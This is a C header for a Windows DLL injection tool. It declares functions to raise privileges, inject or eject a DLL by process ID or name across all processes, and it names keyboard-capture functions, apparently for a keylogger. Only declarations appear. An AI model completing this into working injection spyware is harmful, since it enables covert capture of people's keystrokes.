#pragma once
#ifndef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#define _CRT_SECURE_NO_WARNINGS
#ifndef _INJECTION_HEADER_H__
#define _INJECTION_HEADER_H__
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <time.h>
#include <stdlib.h>
#include <process.h>
#define MAX_PROCESS_NAME_LENGTH 260
#define MAX_FILE_LENGTH 260
#define GET_KEYBOARD_EVENT_FUNC "IsNewKeyHit"
#define GET_KEYBOARD_VALUE_FUNC "GetKeyBoardValue"

typedef DWORD(WINAPI* PFNTCREATETHREADEX)
(
	PHANDLE                 ThreadHandle,
	ACCESS_MASK             DesiredAccess,
	LPVOID                  ObjectAttributes,
	HANDLE                  ProcessHandle,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID                  lpParameter,
	BOOL	                CreateSuspended,
	DWORD                   dwStackSize,
	DWORD                   dw1,
	DWORD                   dw2,
	LPVOID                  Unknown
);

typedef DWORD(*THREAD_FUNC)(PVOID);
typedef BOOL(*PFN_IS_NEW_KEY_HIT)();
typedef char(*PFN_GET_KEYBOARD_VALUE)();

enum { INJECTION_MODE = 0, EJECTION_MODE };
enum { BY_PID = 0, BY_NAME };

BOOL SetPrivilege(LPCTSTR, BOOL);
BOOL InjectDll(DWORD, LPCTSTR);
BOOL EjectDll(DWORD);
BOOL InjectAllProcess(int, LPCTSTR);
BOOL SearchProcess(int, DWORD, const char*,DWORD*);
BOOL MakeFileName(char*);
#endif